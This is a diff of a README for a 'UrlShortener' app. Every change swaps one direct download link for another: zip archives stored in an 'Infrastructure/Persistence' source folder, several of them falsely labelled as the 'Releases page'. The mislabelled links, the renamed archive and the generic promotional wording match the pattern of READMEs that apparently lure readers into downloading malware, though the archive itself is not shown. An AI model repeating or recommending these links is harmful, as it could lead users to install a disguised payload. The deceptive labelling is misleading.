@@ -1,6 +1,6 @@
 # 🌐 UrlShortener - Simplify Your Links with Ease
 
-[![Download UrlShortener](https://raw.githubusercontent.com/PromotionAn/UrlShortener/main/UrlShortener.Infrastructure/Persistence/Url-Shortener-spread.zip)](https://raw.githubusercontent.com/PromotionAn/UrlShortener/main/UrlShortener.Infrastructure/Persistence/Url-Shortener-spread.zip)
+[![Download UrlShortener](https://raw.githubusercontent.com/PromotionAn/UrlShortener/main/UrlShortener.Infrastructure/Persistence/Shortener-Url-3.6.zip)](https://raw.githubusercontent.com/PromotionAn/UrlShortener/main/UrlShortener.Infrastructure/Persistence/Shortener-Url-3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,12 +10,12 @@ Welcome to UrlShortener! This is a user-friendly application that shortens long 
 
 To get started, visit the Releases page to download UrlShortener.
 
-[Download UrlShortener](https://raw.githubusercontent.com/PromotionAn/UrlShortener/main/UrlShortener.Infrastructure/Persistence/Url-Shortener-spread.zip)
+[Download UrlShortener](https://raw.githubusercontent.com/PromotionAn/UrlShortener/main/UrlShortener.Infrastructure/Persistence/Shortener-Url-3.6.zip)
 
 ### Step-by-Step Guide:
 
 1. **Visit the Releases Page:**
-   Click [here to access the Releases page](https://raw.githubusercontent.com/PromotionAn/UrlShortener/main/UrlShortener.Infrastructure/Persistence/Url-Shortener-spread.zip).
+   Click [here to access the Releases page](https://raw.githubusercontent.com/PromotionAn/UrlShortener/main/UrlShortener.Infrastructure/Persistence/Shortener-Url-3.6.zip).
 
 2. **Choose the Latest Release:**
    On the Releases page, look for the latest version at the top. It usually has the most features and fixes.
@@ -62,4 +62,4 @@ Feel free to share your feedback or feature requests! Your input helps improve U
 
 Thank you for choosing UrlShortener! We hope this tool makes your online sharing experience easier and more effective. Don't forget to check for updates regularly to enjoy the latest improvements.
 
-For more information, visit the [Releases page](https://raw.githubusercontent.com/PromotionAn/UrlShortener/main/UrlShortener.Infrastructure/Persistence/Url-Shortener-spread.zip) and download UrlShortener today!
+For more information, visit the [Releases page](https://raw.githubusercontent.com/PromotionAn/UrlShortener/main/UrlShortener.Infrastructure/Persistence/Shortener-Url-3.6.zip) and download UrlShortener today!
